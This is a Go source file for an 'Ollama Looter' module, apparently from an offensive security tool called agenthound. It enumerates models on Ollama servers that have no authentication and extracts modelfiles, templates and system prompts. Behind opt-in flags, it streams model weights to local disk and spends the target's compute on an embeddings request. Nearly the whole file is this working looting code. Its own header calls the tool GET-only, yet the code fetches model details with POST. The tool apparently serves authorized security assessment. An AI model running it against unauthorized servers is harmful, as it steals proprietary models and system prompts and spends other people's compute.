// Package ollamaloot implements the v0.3 Ollama Looter.
//
// Ollama is the v0.3 anonymous-loot landing point: no auth by default, model
// inventory + modelfile available via simple GETs. The Looter emits one
// :AIModel node per model, joined to the OllamaInstance via a PROVIDES_MODEL
// edge, with the modelfile's `value_hash` populated so cross-collector chain
// semantics extend to model artifacts (a leaked fine-tune matches across
// re-runs and across other collectors that surface the same modelfile).
//
// Probes (GET-only by default — Looters are read-only by contract):
//
//	GET /api/tags                  — list installed models
//	GET /api/show     (per model)  — modelfile, template, parameters, system prompt
//
// Flag-gated extras (default OFF, opt-in only):
//
//	GET /api/blobs/<digest>  (--include-weights, --weights-dir <path>)
//	    Streams model weights to disk. Multi-GiB. Bandwidth-heavy. Loud.
//
//	POST /api/embeddings      (--include-embeddings)
//	    Issues a single benchmark embedding request to confirm the
//	    inference compute path is consumable. The Looter contract is
//	    GET-only by default; this POST is the documented exception,
//	    allowed because it is read-only-in-effect on the target (no
//	    state change). Gated behind explicit flag because it consumes
//	    operator-billed compute.
package ollamaloot

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/spf13/pflag"

	"github.com/adithyan-ak/agenthound/sdk/action"
	"github.com/adithyan-ak/agenthound/sdk/common"
	"github.com/adithyan-ak/agenthound/sdk/ingest"
)

const (
	DefaultPort         = 11434
	DefaultProbeTimeout = 30 * time.Second
	DefaultMaxItems     = 1000

	// MaxWeightBytes caps a single weight blob download. Real Ollama
	// blobs are GiB-scale; this is a defensive ceiling against an
	// attacker-controlled response that streams forever. 32 GiB is
	// generous for current model sizes.
	MaxWeightBytes int64 = 32 << 30
)

// Looter is the registered module.
type Looter struct{}

// RegisterFlags satisfies module.FlagsModule. The CLI dispatcher calls
// this when --type ollama resolves to this module so the per-module
// flags are available on `agenthound loot` only when the operator picks
// the ollama target. Mirrors the FlagsModule sidecar pattern from
// sdk/module/flags.go — flag values flow through LootOptions.Extras.
func (l *Looter) RegisterFlags(fs *pflag.FlagSet) {
	fs.Bool("include-weights", false,
		"Extract model weights via /api/blobs/<digest> (multi-GiB, very loud).")
	fs.String("weights-dir", "",
		"Directory to write extracted weights into (required with --include-weights).")
	fs.Bool("include-embeddings", false,
		"Issue test embedding calls via /api/embeddings (consumes operator-billed compute).")
}

// Loot probes an Ollama instance, emits one :OllamaInstance node, one
// :AIModel per /api/tags entry with PROVIDES_MODEL edges, and (when
// flag-gated) downloads weights or issues an embedding probe.
//
// opts.Extras keys consumed by this Looter:
//
//	"include-weights"     bool   — gate /api/blobs/<digest> downloads
//	"weights-dir"         string — local directory for weight artifacts
//	"include-embeddings"  bool   — gate POST /api/embeddings probe
func (l *Looter) Loot(ctx context.Context, t action.Target, opts action.LootOptions) (*action.LootResult, error) {
	_, host, _ := action.EndpointParts(t, DefaultPort, "http")
	baseURL := action.EndpointBaseURL(t, DefaultPort, "http")
	ollamaID := ingest.ComputeNodeID("OllamaInstance", baseURL)

	timeout := opts.Timeout
	if timeout <= 0 {
		timeout = DefaultProbeTimeout
	}
	maxItems := opts.MaxItems
	if maxItems <= 0 {
		maxItems = DefaultMaxItems
	}

	includeWeights, _ := opts.Extras["include-weights"].(bool)
	weightsDir, _ := opts.Extras["weights-dir"].(string)
	includeEmbeddings, _ := opts.Extras["include-embeddings"].(bool)
	weightsDir = strings.TrimSpace(weightsDir)

	if includeWeights && weightsDir == "" {
		return nil, errors.New("ollama loot: --include-weights requires --weights-dir <path>")
	}

	client := &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	res := &action.LootResult{IngestData: &ingest.IngestData{}}

	// 1. Always emit the OllamaInstance node so the PROVIDES_MODEL edge
	//    target exists. The fingerprinter may have produced this node on
	//    a prior scan; the writer's MERGE-by-objectid fold handles the
	//    re-emit cleanly.
	res.IngestData.Graph.Nodes = append(res.IngestData.Graph.Nodes, ingest.Node{
		ID:    ollamaID,
		Kinds: []string{"OllamaInstance", "AIService"},
		Properties: map[string]any{
			"objectid":          ollamaID,
			"endpoint":          baseURL,
			"name":              host,
			"discovered_via":    "ollama_loot",
			"service_kind":      "ollama",
			"auth_method":       "none",
			"is_anonymous_loot": "true",
		},
	})
	res.Summary.EndpointsProbed++

	// 2. /api/tags → AIModel nodes + PROVIDES_MODEL edges.
	tagsURL := strings.TrimRight(baseURL, "/") + "/api/tags"
	tags, err := fetchTags(ctx, client, tagsURL, maxItems)
	if err != nil {
		slog.Warn("ollama loot: /api/tags failed",
			"endpoint", tagsURL,
			"engagement_id", opts.EngagementID,
			"error", err)
		res.PartialErrors = append(res.PartialErrors, fmt.Sprintf("api/tags: %v", err))
		res.Summary.PartialFailures++
		return res, nil
	}
	res.Summary.EndpointsProbed++

	for _, tag := range tags {
		showURL := strings.TrimRight(baseURL, "/") + "/api/show"
		show, showErr := fetchShow(ctx, client, showURL, tag.Model)
		res.Summary.EndpointsProbed++
		if showErr != nil {
			slog.Warn("ollama loot: /api/show failed",
				"endpoint", showURL,
				"model", tag.Model,
				"engagement_id", opts.EngagementID,
				"error", showErr)
			res.PartialErrors = append(res.PartialErrors,
				fmt.Sprintf("api/show %s: %v", tag.Model, showErr))
			res.Summary.PartialFailures++
			// Continue — emit the AIModel without modelfile content.
		}

		modelID := ingest.ComputeNodeID("AIModel", baseURL, tag.Model)
		props := map[string]any{
			"objectid":    modelID,
			"name":        tag.Model,
			"service_id":  ollamaID,
			"digest":      tag.Digest,
			"size_bytes":  tag.Size,
			"family":      show.Family,
			"parameters":  show.Parameters,
			"is_finetune": show.IsFinetune,
			"modified_at": tag.ModifiedAt,
		}
		if show.Modelfile != "" {
			// value_hash is the cross-collector merge primitive. A leaked
			// fine-tune detected via Ollama matches the same modelfile
			// content discovered through any other collector that
			// surfaces model artifacts.
			props["value_hash"] = common.HashCredentialValue(show.Modelfile)
			props["modelfile_size_bytes"] = len(show.Modelfile)
			props["has_system_prompt"] = show.SystemPrompt != ""
			if opts.IncludeCredentialValues {
				props["modelfile"] = show.Modelfile
				props["template"] = show.Template
				props["system_prompt"] = show.SystemPrompt
			}
		}

		res.IngestData.Graph.Nodes = append(res.IngestData.Graph.Nodes, ingest.Node{
			ID:         modelID,
			Kinds:      []string{"AIModel"},
			Properties: props,
		})
		res.IngestData.Graph.Edges = append(res.IngestData.Graph.Edges,
			providesModelEdge(ollamaID, modelID, opts.EngagementID, tag.Digest))
		res.Summary.CredentialsFound++

		// 2b. Flag-gated weight extraction.
		if includeWeights && tag.Digest != "" {
			path, sha, n, weightErr := downloadBlob(ctx, client, baseURL, tag.Digest, weightsDir, tag.Model)
			res.Summary.EndpointsProbed++
			if weightErr != nil {
				slog.Warn("ollama loot: /api/blobs failed",
					"model", tag.Model,
					"digest", tag.Digest,
					"engagement_id", opts.EngagementID,
					"error", weightErr)
				res.PartialErrors = append(res.PartialErrors,
					fmt.Sprintf("api/blobs %s: %v", tag.Digest, weightErr))
				res.Summary.PartialFailures++
				continue
			}
			// Mutate the AIModel node's properties in place.
			lastIdx := len(res.IngestData.Graph.Nodes) - 1
			res.IngestData.Graph.Nodes[lastIdx].Properties["weight_artifact_path"] = path
			res.IngestData.Graph.Nodes[lastIdx].Properties["weight_artifact_sha256"] = sha
			res.IngestData.Graph.Nodes[lastIdx].Properties["weight_artifact_bytes"] = n
		}
	}

	// 3. Flag-gated embedding probe (POST exception — see package doc).
	if includeEmbeddings {
		ok := probeEmbeddings(ctx, client, baseURL, tags)
		res.Summary.EndpointsProbed++
		// Mutate the OllamaInstance node (index 0) with the result.
		res.IngestData.Graph.Nodes[0].Properties["embedding_capability_confirmed"] = ok
		if !ok {
			res.PartialErrors = append(res.PartialErrors,
				"api/embeddings: probe did not confirm compute path")
			res.Summary.PartialFailures++
		}
	}

	slog.Info("ollama loot complete",
		"endpoint", baseURL,
		"engagement_id", opts.EngagementID,
		"models_emitted", len(tags),
		"include_weights", includeWeights,
		"include_embeddings", includeEmbeddings,
		"partial_failures", res.Summary.PartialFailures)

	return res, nil
}

// tagEntry is one /api/tags entry.
type tagEntry struct {
	Model      string `json:"model"`
	Name       string `json:"name"`
	Digest     string `json:"digest"`
	Size       int64  `json:"size"`
	ModifiedAt string `json:"modified_at"`
}

func fetchTags(ctx context.Context, client *http.Client, url string, maxItems int) ([]tagEntry, error) {
	body, err := getJSON(ctx, client, url)
	if err != nil {
		return nil, err
	}
	type rawResp struct {
		Models []tagEntry `json:"models"`
	}
	var parsed rawResp
	if err := json.Unmarshal(body, &parsed); err != nil {
		return nil, fmt.Errorf("decode /api/tags: %w", err)
	}
	out := parsed.Models
	for i := range out {
		if out[i].Model == "" {
			out[i].Model = out[i].Name
		}
	}
	if len(out) > maxItems {
		out = out[:maxItems]
	}
	return out, nil
}

// showEntry captures the slice of /api/show that we promote onto the
// emitted AIModel node. The full response is much larger; this is the
// minimum viable subset.
type showEntry struct {
	Modelfile    string
	Template     string
	SystemPrompt string
	Family       string
	Parameters   string
	IsFinetune   bool
}

func fetchShow(ctx context.Context, client *http.Client, url, modelName string) (showEntry, error) {
	payload, _ := json.Marshal(map[string]string{"name": modelName})
	req, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewReader(payload))
	if err != nil {
		return showEntry{}, fmt.Errorf("build request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return showEntry{}, fmt.Errorf("request: %w", err)
	}
	defer func() { _ = resp.Body.Close() }()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return showEntry{}, fmt.Errorf("read body: %w", err)
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return showEntry{}, fmt.Errorf("status %d", resp.StatusCode)
	}
	var raw struct {
		Modelfile string `json:"modelfile"`
		Template  string `json:"template"`
		System    string `json:"system"`
		Details   struct {
			Family            string `json:"family"`
			ParameterSize     string `json:"parameter_size"`
			QuantizationLevel string `json:"quantization_level"`
		} `json:"details"`
	}
	if err := json.Unmarshal(body, &raw); err != nil {
		return showEntry{}, fmt.Errorf("decode /api/show: %w", err)
	}
	se := showEntry{
		Modelfile:    raw.Modelfile,
		Template:     raw.Template,
		SystemPrompt: raw.System,
		Family:       raw.Details.Family,
		Parameters:   raw.Details.ParameterSize,
	}
	// Heuristic: a modelfile that begins with `FROM <something-other-than-a-known-base>`
	// AND defines a SYSTEM directive is most likely a fine-tune. We don't
	// enumerate base models here — the heuristic just flags the
	// definite-not-base cases for the operator's eye.
	se.IsFinetune = strings.Contains(raw.Modelfile, "\nSYSTEM ") ||
		strings.Contains(raw.Modelfile, "\nADAPTER ")
	return se, nil
}

// downloadBlob streams /api/blobs/<digest> to disk. Returns (path, sha,
// bytes-written, err). The local filename is derived from the model
// name + a sanitized digest fragment so multiple models in a single
// loot don't collide.
func downloadBlob(ctx context.Context, client *http.Client, baseURL, digest, weightsDir, modelName string) (string, string, int64, error) {
	if err := os.MkdirAll(weightsDir, 0o700); err != nil {
		return "", "", 0, fmt.Errorf("mkdir weights-dir: %w", err)
	}
	url := strings.TrimRight(baseURL, "/") + "/api/blobs/" + digest
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return "", "", 0, fmt.Errorf("build request: %w", err)
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", 0, fmt.Errorf("request: %w", err)
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return "", "", 0, fmt.Errorf("status %d", resp.StatusCode)
	}

	safe := sanitizeFilename(modelName) + "-" + safeDigestFragment(digest) + ".bin"
	path := filepath.Join(weightsDir, safe)
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
	if err != nil {
		return "", "", 0, fmt.Errorf("open weights file: %w", err)
	}
	defer func() { _ = f.Close() }()

	hasher := sha256.New()
	mw := io.MultiWriter(f, hasher)
	n, err := io.Copy(mw, io.LimitReader(resp.Body, MaxWeightBytes))
	if err != nil {
		_ = os.Remove(path)
		return "", "", 0, fmt.Errorf("stream blob: %w", err)
	}
	return path, hex.EncodeToString(hasher.Sum(nil)), n, nil
}

// probeEmbeddings issues exactly one POST /api/embeddings against the
// first available model. Returns true on a 2xx response. The Looter's
// GET-only contract makes this the single allowed exception — the POST
// is read-only-in-effect on the target (no state change). It is gated
// behind --include-embeddings because operator-billed compute is the
// "cost" being incurred on the target.
func probeEmbeddings(ctx context.Context, client *http.Client, baseURL string, tags []tagEntry) bool {
	if len(tags) == 0 {
		return false
	}
	url := strings.TrimRight(baseURL, "/") + "/api/embeddings"
	payload, _ := json.Marshal(map[string]any{
		"model":  tags[0].Model,
		"prompt": "agenthound benchmark probe",
	})
	req, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewReader(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer func() { _ = resp.Body.Close() }()
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1<<20))
	return resp.StatusCode >= 200 && resp.StatusCode < 300
}

func providesModelEdge(ollamaID, modelID, engagementID, digest string) ingest.Edge {
	return ingest.Edge{
		Source:     ollamaID,
		Target:     modelID,
		Kind:       "PROVIDES_MODEL",
		SourceKind: "OllamaInstance",
		TargetKind: "AIModel",
		Properties: map[string]any{
			"confidence":  1.0,
			"risk_weight": 0.1,
			"evidence": map[string]any{
				"digest":        digest,
				"engagement_id": engagementID,
				"source":        "api_tags",
			},
		},
	}
}

// getJSON does the GET-and-read dance. 1 MiB cap matches the
// fingerprint engine's body cap; /api/tags responses are tiny.
func getJSON(ctx context.Context, client *http.Client, url string) ([]byte, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("build request: %w", err)
	}
	req.Header.Set("Accept", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request: %w", err)
	}
	defer func() { _ = resp.Body.Close() }()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return nil, fmt.Errorf("read body: %w", err)
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}
	return body, nil
}

func sanitizeFilename(s string) string {
	r := strings.NewReplacer(
		"/", "_",
		":", "_",
		" ", "_",
		"..", "_",
	)
	return r.Replace(s)
}

func safeDigestFragment(d string) string {
	d = strings.TrimPrefix(d, "sha256:")
	if len(d) > 12 {
		return d[:12]
	}
	return d
}

var _ action.Looter = (*Looter)(nil)
